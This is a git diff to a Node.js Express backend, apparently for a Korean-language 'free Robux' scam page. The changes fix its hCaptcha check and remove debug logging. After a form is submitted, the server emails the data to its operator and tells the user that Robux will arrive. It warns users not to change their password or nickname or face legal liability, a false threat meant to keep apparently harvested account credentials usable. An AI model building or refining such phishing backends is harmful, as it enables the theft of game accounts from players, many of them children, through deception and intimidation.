@@ -3,6 +3,7 @@ const nodemailer = require("nodemailer");
 const bodyParser = require("body-parser");
 const axios = require('axios');
 require('dotenv').config();
+const querystring = require('querystring');
 const app = express();
 const port = 3000;
 
@@ -34,6 +35,11 @@ app.post("/robux", async (req, res) => {
     const _3rdperson_checked = _3rdperson === "true" ? "✅ 제 3자 제공 동의 허용" : "❌ 제 3자 제공 동의 거부";
     const advertise_checked = advertise === "true" ? "✅ 마케팅 활용 동의 허용" : "❌ 마케팅 활용 동의 거부";
 
+    const postData = querystring.stringify({
+        secret: process.env.HCAPTCHA_SECRET_KEY,
+        response: req.body['h-captcha-response']
+    });
+
     if (!token) {
         return res.status(400).send('hCaptcha 응답이 없습니다.');
     }
@@ -41,17 +47,15 @@ app.post("/robux", async (req, res) => {
     try {
         const verifyURL = `https://hcaptcha.com/siteverify`;
 
-        const response = await axios.post(verifyURL, null, {
-            params: {
-                secret: SECRET_KEY,
-                response: token
+        const response = await axios.post('https://hcaptcha.com/siteverify', postData, {
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
             }
         });
 
         const success = response.data.success;
 
         if (success) {
-            res.send('hCaptcha 인증 성공!');
             // Nodemailer transporter 설정
             const transporter = nodemailer.createTransport({
                 service: "gmail",
@@ -81,16 +85,13 @@ ${advertise_checked}
 
             transporter.sendMail(mailOptions, (error, info) => {
                 if (error) {
-                    console.log(error);
                     return res.send("ERROR PLEASE TRY AGAIN");
                 } else {
                     return res.send("빠른 시일 내에 당신의 계정에 로벅스가 들어올 것입니다. 로벅스가 들어오기 전까지 비밀번호와 닉네임을 변경하지 마십시오. 그렇지 않으면 우리 API에 문제가 생겨 전송에 실패하게 되고 당신은 트래픽 과다 이용으로 법적 책임을 물 수 있습니다.");
                 }
             });
         } else {
-            res.status(403).send('hCaptcha 인증 실패.'  + JSON.stringify(response.data));
-            console.log('폼에서 받은 토큰:', req.body['h-captcha-response']);
-            console.log('로드된 SECRET_KEY:', process.env.HCAPTCHA_SECRET_KEY);
+            res.status(403).send('hCaptcha 인증 실패.' + JSON.stringify(response.data));
 
         }
     } catch (err) {
